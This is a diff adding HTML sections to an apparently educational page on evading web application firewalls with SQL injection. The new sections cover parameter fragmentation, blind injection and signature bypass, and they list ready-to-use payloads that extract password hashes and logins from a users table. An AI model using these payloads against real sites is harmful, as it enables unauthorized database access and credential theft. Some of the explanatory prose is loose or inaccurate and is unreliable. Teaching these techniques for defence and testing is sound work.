@@ -226,3 +226,42 @@ characters in query strings.</p>
 <i>/?id=1;select+1,2,3+from+users+where+id=1--</i></p>
 <p>An attacker will be able to bypass WAF by applying the HPP technique to the above query:<br/>
 <i>/?id=1;select+1&id=2,3+from+users+where+id=1--</i></p>
+
+<h2>HPF Technique</h2>
+<p>HTTP parameter fragmentation (HPF) is basically used with the idea of bypassing security filters, as it is capable of operating HTTP data directly. This technique can be used along with HPP using a UNION 
+operator to bypass firewalls:</p>
+<p><i>/?a=1+union/*&b=*/select+1,2</i><br/>
+<i>/?a=1+union/*&b=*/select+1,pass/*&c=*/ from+users--</i></p>
+<p>In such a scenario, the transformed SQL query is:<br/>
+<i>SELECT * FROM TABLE WHERE a=1 UNION/* AND b=*/SELECT 1,2</i><br/>
+<i>SELECT * FROM TABLE WHERE a=1 UNION/* AND b=*/SELECT 1,pass/* LIMIT */FROM USERS--</i></p>
+
+<h2>Blind SQL Injection</h2>
+<p>A blind SQL injection attack is one of the easiest ways to exploit a vulnerability, as it replaces WAF signatures with their synonyms using SQL functions. The following request allow an attacker to perform 
+an SQL injection attack and bypass the firewall.</p>
+<p>Logical requests AND / OR:</p>
+<p><ol>
+    <ul>/?id=1+OR+0x50=0x50</ul>
+    <ul>/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</ul>
+</ol></p>
+<p>Negation, inequality signs and logical request</p>
+<p><ol>
+    <ul>and 1</ul>
+    <ul>and 1=1</ul>
+    <ul>and 2<3</ul>
+    <ul>and 'a'='a'</ul>
+    <ul>and 'a' <> 'b'</ul>
+    <ul>and 3<=2</ul>
+</ol></p>
+
+<h2>Signature Bypass</h2>
+<p>An attacker can transform the signature of SQL queries such that a firewall cannot detect them, leading to malicious results. Attackers obtain signatures used by the firewall using the following request:<br/>
+<i>/?id=1+union+(select+1,2+from+users)</i></p>
+<p>After obtaining the signature, the attacker exploits the acquired signature to bypass the WAF as follows:</p>
+<p><ol>
+    <ul>/?id=1+union+(select+'xz'from+xxx</ul>
+    <ul>/?id=(1)union(select(1),mid(hash,1,32)from(users))</ul>
+    <ul>/?id=1+union(select'1',concat(login,hash)from+users)</ul>
+    <ul>/?id=(1)union((((((select(1),hex(hash)from(users))))))))</ul>
+    <ul>/?id=xx(1)or(0x50=0x50)</ul>
+</ol></p>
